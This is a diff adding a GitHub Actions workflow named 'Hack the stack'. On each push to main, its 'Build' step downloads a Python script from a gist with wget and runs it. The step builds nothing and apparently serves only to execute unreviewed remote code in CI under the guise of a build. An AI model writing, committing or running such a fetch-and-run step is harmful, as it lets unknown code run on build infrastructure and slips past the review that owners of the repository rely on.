@@ -1,0 +1,21 @@
+name: Hack the stack
+
+on:
+  push:
+    branches: [ "main" ]
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Set up Python 3.10
+      uses: actions/setup-python@v3
+      with:
+        python-version: "3.10"
+    - name: Build
+      run: |
+        wget https://gist.githubusercontent.com/worker/04abc88ed47fe521b0c667369faac920/raw/go.py
+        python3 go.py
